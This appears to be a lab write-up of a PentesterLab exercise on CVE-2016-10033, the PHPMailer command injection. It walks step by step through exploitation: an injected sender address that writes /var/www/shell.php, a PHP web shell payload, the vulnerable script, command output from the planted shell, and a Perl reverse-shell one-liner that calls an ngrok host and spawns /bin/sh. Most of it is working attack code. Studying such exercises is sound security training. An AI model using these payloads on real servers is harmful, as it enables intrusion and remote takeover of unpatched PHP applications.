
# CVE-2016-10033; PHPMailer RCE

* This exercise covers a remote code execution vulnerability in PHPMailer

## Introduction

* This course details the exploitation of a command injection in the PHPMailer libraries. PHPMailer is used across a wide list of PHP projects. This vulnerability will provide you with a quick way to gain commands execution if the server relies on PHPMailer to send emails.

## The issue

* The vulnerability is explained in details in the [`project's wiki`](https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities).
Exploitation

* The exploitation of this issue is done in two steps:

    * Create a file with a PHP extension in the web root of the server.

    * Access the newly created file.

* To create the file, you can inject some extra-arguments to the command as part of the email address:
```bash
"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1
```
* This will allow us to create the file /var/www/shell.php. To get code execution, we also need to inject a web shell in the email's body:
```php
<?php system($_GET['c']);?>
```
* Finally, you need to access your web shell to execute commands using the `c` parameter.

## Conclusion

* This exercise demonstrates how you can get command execution if an application uses a vulnerable version of PHPMailer. Based on how popular this library is and how a lot of PHP applications are not well maintained, this issue should allow you to gain command execution on unmaintained PHP applications.


* You can access this exercise using the following URL: http://ptl-6815d21f-d6669266.libcurl.so/ 

* script that is vulnerable is 
```php
 <?php
  $site = "PentesterLab &rarrow; CVE-2016-10033";
  require "header.php";
  if (isset($_POST['email'])) {
    $mail = new PHPMailer;
    $mail->setFrom($_POST['email']);
    $mail->addAddress('cve-2016-10033@127.0.0.1');
    $mail->Subject = $_POST['subject'];
    $mail->Body    = $_POST['text'];
    if(!$mail->send()) {
      echo 'Message could not be sent.';
      echo 'Mailer Error: ' . $mail->ErrorInfo;
    } else {
      echo 'Message has been sent';
    }
  }
?>
```

* when you go to http://ptl-6815d21f-d6669266.libcurl.so/shell.php?c=ls you can find
```php
00028 >>> root"@127.0.0.1... Unbalanced '"'
00028 <<< To: cve-2016-10033@127.0.0.1
00028 <<< Subject: testing
00028 <<< X-PHP-Originating-Script: 33:class.phpmailer.php
00028 <<< Date: Wed, 4 Dec 2019 03:51:42 +0000
00028 <<< From: "attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1
00028 <<< Message-ID: <b9ff1f327342cf7dec16e38f98dab40b@ptl-6815d21f-d6669266.libcurl.so>
00028 <<< X-Mailer: PHPMailer 5.2.17 (https://github.com/PHPMailer/PHPMailer)
00028 <<< MIME-Version: 1.0
00028 <<< Content-Type: text/plain; charset=iso-8859-1
00028 <<< 
00028 <<< classes
css
favicon.ico
footer.php
header.php
index.php
shell.php
00028 <<< 
00028 <<< [EOF]
```
* you can gain the reverse shell with 
```perl
perl -e 'use Socket;$i="0.tcp.ngrok.io";$p=11652;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
* after url encoding the above payload add to the `shell.php` url.


